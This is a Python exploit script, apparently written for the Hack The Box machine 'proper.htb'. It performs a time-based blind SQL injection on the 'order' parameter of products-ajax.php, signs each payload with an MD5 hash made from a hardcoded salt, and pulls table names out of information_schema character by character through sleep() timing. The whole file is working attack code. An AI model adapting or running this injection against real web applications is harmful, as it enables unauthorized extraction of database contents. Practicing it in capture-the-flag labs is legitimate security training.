#!/usr/bin/python3

import requests, string, hashlib, time
import signal, sys, argparse
from pwn import *

# Argumentos
parse = argparse.ArgumentParser()
parse.add_argument('--db', dest="db_name", type=str, default="cleaner", help="Base de datos de la que quieres ver sus tablas (default: cleaner)")
args = parse.parse_args()

# Variables
url = "http://proper.htb/products-ajax.php"
salt = "hie0shah6ooNoim"
dic = string.ascii_letters + string.digits + string.punctuation + "£"
result = ""

# Color
class Color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

p1 = log.progress("p4ylOAd")
for row in range(10):
    p2 = log.progress(f"taBLa [{row}]")
    for pos_word in range(1,101):
        for letter in dic:
            payload = f"IF(Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{args.db_name}' LIMIT {row},1),{pos_word},1))={ord(letter)},sleep(0.3),0)#"
            hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

            p1.status(payload)
            p2.status(result + letter)

            time_before = time.time()

            data_get = {"order":payload, "h":hashh}
            r = requests.get(url, params=data_get)

            time_after = time.time()

            if time_after - time_before > 3:
                result += letter
                p2.status(result)
                break
            elif letter == "£":
                break

        if letter == "£" and pos_word == 1:
            p1.success("FINAAAAAL")
            p2.success(Color.RED + "----no---hay---más----" + Color.END)
            exit(0)
        elif letter == "£":
            p2.success(Color.BLUE + result + Color.END)
            result = ""
            break
    
p1.success("FINAAAAAL")
